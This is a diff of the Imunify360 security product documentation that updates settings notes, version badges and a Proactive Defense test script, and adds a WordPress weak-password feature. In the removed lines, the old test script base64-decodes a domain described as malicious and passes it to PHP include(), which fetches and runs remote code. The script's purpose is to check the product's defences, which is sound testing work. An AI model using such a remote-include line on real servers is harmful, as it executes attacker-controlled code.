@@ -206,7 +206,7 @@ There is a color indication for IP address.
 * <span class="notranslate">_Country_ </span>– country origin of the abuser IP address.
 * <span class="notranslate">_# of Times_</span> – the number of times the abuser tried to repeat the action.
 * <span class="notranslate">_Event_</span> – description of the event or suspicious activity (as it is described by OSSEC and Mod_Security sensors).
-* <span class="notranslate">_Severity_</span> – severity level of the incidents (as it is estimated in [OSSEC severity levels](http://ossec-docs.readthedocs.io/en/latest/manual/rules-decoders/rule-levels.html) and [Mod_Security severity levels](https://github.com/SpiderLabs/ModSecurity/wiki/Reference-Manual-%28v2.x%29#severity)). The color of severity means:
+* <span class="notranslate">_Severity_</span> – severity level of the incidents (as it is estimated in [OSSEC severity levels](https://ossec-docs.readthedocs.io/en/latest/docs/manual/rules-decoders/rule-levels.html?highlight=severity%20level) and [Mod_Security severity levels](https://github.com/SpiderLabs/ModSecurity/wiki/Reference-Manual-%28v2.x%29#severity)). The color of severity means:
 
   * Green – Mod_Security levels 7-5, OSSEC levels 00-03
   * Orange – Mod_Security level 4, OSSEC levels 04-10
@@ -447,6 +447,10 @@ If <span class="notranslate">_Show only manually added_</span> switcher is disab
 Regardless of switched CSF off or on, blocked by Imunify360 IPs exist along with CSF deny list. Warning displayed at the top of the table says that CSF is running and can be used for blacklisting along with Imunify360.
 :::
 
+:::warning Warning
+For now, ipset supports only IPv6/64 networks
+:::
+
 #### How to add a country manually
 
 To add a country to the Black List, click <span class="notranslate">_Add_</span> on the right side of the page.
@@ -603,10 +607,6 @@ This is also a real time file scanner for vulnerability and it can:
 
 * scan on-demand (any folder needed)
 
-::: tip Note
-When using Mod_Security for real-time scans, it is only possible to detect file owner if Apache is running with `mod_ruid2` configured. In other cases, the user for these files will always be the user a web server is running under (usually <span class="notranslate">`nobody`</span>).
-:::
-
 Malware scanning allows you to:
 
 * observe scanner activity
@@ -729,9 +729,13 @@ It is possible to scan a specific directory for malware. Go to <span class="notr
 	     * from <span class="notranslate">Low</span> to <span class="notranslate">High</span>.
    * <span class="notranslate">_I/O consumption_</span>. Defines the I/O consumption for scanning without decreasing efficiency:
 	     * from <span class="notranslate">Low</span> to <span class="notranslate">High</span>.
-	* <span class="notranslate">_Follow symlinks<sup> 3.9.0+</sup>_</span>. Follow all symlinks within the folder to scan. 
+	* <span class="notranslate">_Follow symlinks_</span>. Follow all symlinks within the folder to scan. 
 
-![](/images/malware_scanner.png)
+:::tip Note
+If Imunify360 <sup>4.6+</sup> is running on CloudLinux OS, LVE is used to manage scan intensity. If it is running on other operating systems, “nice” is used to control CPU and “ionice” is used when the I/O scheduler is CFQ.
+:::
+
+![](/images/malware_scanner_4_7.png)
 
 1. Click <span class="notranslate">_Start_</span>.
 
@@ -966,29 +970,94 @@ The <span class="notranslate">_Ignore List_</span> table includes the following 
 
 ``` PHP
 <?php
-/* Imunify360 Proactive Defence test script */
-
-echo "<pre>";
-echo "Step 1<br>";
-
-// Decode string with domain: 37kddsserrt.xyz
-$url=base64_decode("MzdrZGRzc2VycnQueHl6");
-
-echo "Step 2<br>";
-echo "</pre>";
-
-// Try to access a malicious domain
-include($url);
-die();
+$ffile = tmpfile();
+$string2 = 'test';
+$triim = trim($string2, "s");
+$string = 'cup';
+$name = 'coffee';
+$str = 'This is a $string with my $name in it.';
+$arr = array('Hello','World!','Beautiful','Day!');
+eval("\$str = \"$str\";");
+$a = 1;
+while($a <= 255) {
+$aaa = is_string($string2);
+$a++;
+}
+$b = 1;
+while($b <= 255) {
+$bbb = strstr($string2, '1');
+$ccc = strchr($string2, '2');
+$b++;
+}
+$c = 1;
+while($c <= 255) {
+$ccc = strtoupper($string2);
+$ddd = crc32($string2);
+$c++;
+}
+$d =1;
+while($d <= 255) {
+$ddd = strtolower($string2);
+$ttt = join(" ",$arr);
+$d++;
+}
+$e =1;
+while($e <= 255) {
+$eee = is_bool($string2);
+$ppp = implode(",", $arr);
+$e++;
+}
+$f = 1;
+while($f <= 255) {
+$fff = strlen($string2);
+$kkk = str_word_count($string2, 1);
+$f++;
+}
+$g = 1;
+while($g <= 255) {
+$ggg = is_array($string2);
+$g++;
+}
+$h = 1;
+while($h <= 255) {
+$hhh = is_null($string2);
+$sss = ltrim($string2);
+$h++;
+}
+$j = 1;
+while($j <= 255) {
+$jjj = is_int($string2);
+$j++;
+}
+while($k <= 255) {
+$kkk = is_numeric($string2);
+$k++;
+}
+$triim = trim($string2, "t");
+if (@file_put_contents($ffile, "<?php\n;") !== false){
+print "PD doesn't work or not in KILL mode";
+}
+fclose($ffile);
 ?>
 ```
 </div>
 
 3. Place this file on the server.
 4. Call a test page with the script from the point 2.
-5. If <span class="notranslate">Proactive Defense</span> is disabled, you will see _Step 1_ and _Step 2_ strings after calling the script.
-6. If <span class="notranslate">Proactive Defense</span> is enabled and <span class="notranslate">_Log only_</span> mode is set, you will see _Step 1_ and _Step 2_ strings after calling the script and a new event in the <span class="notranslate">_Detected Events_</span> table.
-7. If <span class="notranslate">Proactive Defense</span> is enabled and <span class="notranslate">_Kill mode_</span> is set, the test page returns an error.
+5. If <span class="notranslate">Proactive Defense</span> is disabled, you will see "PD doesn't work or not in KILL mode" message after calling the script and no records will appear in "Incident" tab.
+6. If <span class="notranslate">Proactive Defense</span> is enabled and <span class="notranslate">_Log only_</span> mode is set, you will see "PD doesn't work or not in KILL mode" message after calling the script and a new event with description "Blamer detection" in the <span class="notranslate">_Detected Events_</span> table with "LOG" action.
+7. If <span class="notranslate">Proactive Defense</span> is enabled and <span class="notranslate">_Kill mode_</span> is set, the test page returns an error.And a new event with description "Blamer detection" in the <span class="notranslate">_Detected Events_</span> table with "KILL" action.
+
+::: tip Note
+the number of triggered rule is 24 and it is possible to check it via CLI
+<div class="notranslate">
+
+```
+imunify360-agent proactive list
+```
+</div>
+:::
+
 
 ## Reputation Management
 
@@ -1181,6 +1250,23 @@ You can switch back to the normal mode by enabling WebShield or unchecking <span
 
 Click <span class="notranslate">_Save changes_</span> button on the bottom of the section to save changes.
 
+#### WordPress account brute-force protection
+
+Server admin can enable an option to prevent access to WordPress accounts with well-known (trivial) passwords.
+When the option is enabled, all end-users that are trying to log into the admin account with weak/trivial or well-known passwords from the dictionary used by brute-forcers will be taken to the special alert page with an appeal to change their current password.
+
+![](/images/waf_wordpress_acp.png)
+
+This feature can be enabled by setting <span class="notranslate">`cms_account_compromise_prevention` to `true`</span> in MOD_SEC [config file section](/config_file_description/#config-file-description)
+
+:::tip Note
+This feature is implemented via modsec rule and could be partially [disabled on a per-domain basis](/command_line_interface/#rules) (the rule id is 33355)
+:::
+
+![](/images/waf_wordpress_acp_alert.png)
+
+The alert page supports localization and is displayed in the language of the browser.
+
 #### DoS Protection
 
 <span class="notranslate">DoS Protection</span> section allows to enable or disable DoS protection. DoS protection works by counting connections from each remote IP address per local port separately. Starting from Imunify360 4.4 beta it is enabled by default for all new installations.
@@ -1359,9 +1445,9 @@ Click <span class="notranslate">_Save changes_</span> button at the bottom of th
 Here you can configure the following:
 * <span class="notranslate">Resource consumption</span>
 * <span class="notranslate">General</span>
-* <span class="notranslate">Background Scanning</span><sup> Beta 4.1+</sup>
-* <span class="notranslate">Malware Cleanup</span><sup> 3.7.1+</sup>
-* <span class="notranslate">Proactive Defense</span><sup> 4.0+</sup>
+* <span class="notranslate">Background Scanning</span>
+* <span class="notranslate">Malware Cleanup</span>
+* <span class="notranslate">Proactive Defense</span>
 
 
 ::: tip Note
@@ -1382,6 +1468,9 @@ Read [CXS integration](/ids_integration/#cxs-integration) documentation carefull
     Low I/O usage means low scanning speed
     :::
 
+:::tip Note
+If Imunify360 <sup>4.6+</sup> is running on CloudLinux OS, LVE is used to manage scan intensity. If it is running on other operating systems, “nice” is used to control CPU and “ionice” is used when the I/O scheduler is CFQ.
+:::
 
 **General**
 
@@ -1415,7 +1504,7 @@ Those options may be hidden for end-user if Cleanup is disabled in Features Mana
 :::
 
 * <span class="notranslate">_RapidScan_</span> – dramatically speeds up repeated scans based on smart re-scan approach, local result caching and cloud-assisted scan. When you first enable the RapidScan feature, the first scan will run as before. But subsequent scans will see a dramatic speed improvement, anywhere between 5 to 20 times faster. You can find details [here](/features/#rapidscan).
-* <span class="notranslate">_Binary (ELF) malware detection_</span> <sup>Beta</sup> <sup>4.4+</sup> – this option allows to scans user home directories for malware. It’s disabled in Imunify360 version 4.4 by default.
+* <span class="notranslate">_Binary (ELF) malware detection_</span> <sup>4.4+</sup> – this option allows to scans user home directories for malware.
 
 Tick required checkboxes and click <span class="notranslate">_Save changes_</span> button.
 
@@ -1442,7 +1531,7 @@ Depending on the selected period, precise settings.
 You can track the scanning activity at the <span class="notranslate">[Malware Scanner](#malware-scanner)</span> tab.
 
 
-#### Cleanup <sup><Badge text="3.7.1+" type="tip"/></sup>
+#### Cleanup
 
 * <span class="notranslate">_Trim file instead of removal_</span> — do not remove infected file during cleanup but make the file zero-size (for malwares like web-shells);
 * <span class="notranslate">_Keep original files for … days_</span> — the original infected file is available for restore within the defined period. Default is 14 days.
@@ -1450,7 +1539,7 @@ You can track the scanning activity at the <span class="notranslate">[Malware Sc
 ![](/images/malwarescannersettings_zoom70.png)
 
 
-#### Proactive Defense <sup><Badge text="4.2+" type="tip"/></sup>
+#### Proactive Defense
 
 * <span class="notranslate">_Enable Blamer_</span> — tick to allow Imunify360 to find a root cause of how infection got injected into the server through PHP. Blamer pinpoints exact URL, PHP script & PHP execution path that allowed a hacker to inject malware onto the server.
 Imunify360 security team will use that information to prevent future infections from happening.
